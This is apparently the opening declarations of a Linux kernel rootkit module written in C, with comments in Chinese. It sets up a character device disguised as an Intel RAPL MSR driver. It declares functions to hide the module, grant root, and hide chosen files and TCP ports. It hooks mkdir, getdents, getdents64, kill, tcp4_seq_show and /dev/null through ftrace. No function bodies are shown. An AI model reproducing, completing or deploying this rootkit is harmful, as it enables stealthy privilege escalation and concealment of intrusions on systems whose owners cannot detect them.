#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/version.h>
#include "ftrace_helper.h"

#define DEVICE_NAME "inter_rapl_msrdv"
#define CLASS_NAME "inter_rapl_msrmd"
#define DEVICE_PATH "/dev/inter_rapl_msrdv"

static int major_num;
static struct class *module_class = NULL;
static struct device *module_device = NULL;
static struct file *__file = NULL;
struct inode *__inode = NULL;

static int rootkit_open(struct inode *, struct file *);
static int rootkit_release(struct inode *, struct file *);
static ssize_t rootkit_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t rootkit_write(struct file *, const char __user *, size_t, loff_t *);
static long rootkit_ioctl(struct file *, unsigned int, unsigned long);

static struct file_operations rootkit_fo = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = rootkit_ioctl,
    .read = rootkit_read,
    .open = rootkit_open,
    .release = rootkit_release,
    .write = rootkit_write};

static struct list_head *module_prev;
static struct list_head *kobj_prev;

static int module_hide = 0;

struct linux_dirent
{
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen; // the length of this entry
    char d_name[1];
};

// 模块隐藏
static void hide_myself(void);

// 模块隐藏恢复声明
static void show_myself(void);

// 提升root权限函数声明
static void get_root(void);

static int register_dev(void);

static int unregister_dev(void);

// mkdir函数
static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
asmlinkage long hook_mkdir(const struct pt_regs *);

// getdents函数
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
asmlinkage long hook_getdents(const struct pt_regs *);

// getdents64函数
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
asmlinkage long hook_getdents64(const struct pt_regs *);

// kill函数，暂时无用
static asmlinkage long (*orig_kill)(const struct pt_regs *);
asmlinkage long hook_kill(const struct pt_regs *);

// tcp4_seq_show
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *, void *);
asmlinkage long hook_tcp4_seq_show(struct seq_file *, void *);

static asmlinkage ssize_t (*orig_write_null)(struct file *, const char __user *, size_t, loff_t *);
asmlinkage long hook_write_null(struct file *, const char __user *, size_t, loff_t *);

static asmlinkage ssize_t (*orig_read_null)(struct file *, const char __user *, size_t, loff_t *);
asmlinkage long hook_read_null(struct file *, const char __user *, size_t, loff_t *);

// HOOK函数
struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("write_null", hook_write_null, &orig_write_null),
    HOOK("read_null", hook_read_null, &orig_read_null)};

typedef struct name_node
{
    char *name;
    struct list_head list;
} Name_list;
LIST_HEAD(name_list);

int init_node(void);

int insert_file_node(char *);

int delete_file_node(char *);

int print_name_node(void);

// 检查隐藏文件名
int check_file(char *name);

typedef struct port_node
{
    int port;
    struct list_head list;
} Port_list;
LIST_HEAD(port_list);

int insert_port_node(int);

int delete_port_node(int);

int print_port_node(void);

// 检查隐藏端口
int check_port(int);

// 模块加载、卸载函数声明
static int __init rootkit_init(void);
static void __exit rootkit_exit(void);
